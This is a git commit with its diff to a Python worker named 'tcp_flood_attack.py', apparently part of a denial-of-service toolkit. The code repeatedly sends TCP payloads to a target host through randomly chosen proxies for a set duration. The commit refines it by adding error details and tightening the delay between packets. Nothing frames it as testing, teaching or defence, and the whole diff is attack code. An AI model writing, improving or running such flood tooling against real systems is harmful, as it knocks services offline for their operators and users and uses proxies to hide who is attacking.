0be7eaf14815e0501644a0909959027c761ec04f
Sakuzuna <nikita.kopychev@s.wingateschool.com>
2025-02-27 00:06:09 +0000

    Update tcp_flood_attack.py

--- workers/tcp_flood_attack.py
+++ workers/tcp_flood_attack.py
@@ -8,6 +8,7 @@ def tcp_flood_attack(target, proxies, duration, packet_size, packet_delay):
     port = int(port)
     end_time = time.time() + duration
     while time.time() < end_time:
+        start_time = time.time()  
         proxy = random.choice(proxies)
         sock = TcpClient.create_socket(proxy)
         try:
@@ -16,7 +17,9 @@ def tcp_flood_attack(target, proxies, duration, packet_size, packet_delay):
             sock.send(payload.encode())
             print(f"✅ TCP packet sent to {host}:{port} via {proxy['host']}:{proxy['port']}")
         except Exception as e:
-            print(f"❌ TCP packet to {host}:{port} via {proxy['host']}:{proxy['port']} failed")
+            print(f"❌ TCP packet to {host}:{port} via {proxy['host']}:{proxy['port']} failed: {e}")
         finally:
             sock.close()
-        time.sleep(packet_delay / 1000)  
+        elapsed_time = time.time() - start_time  
+        remaining_delay = max(0, (packet_delay / 1000) - elapsed_time)  
+        time.sleep(remaining_delay)  
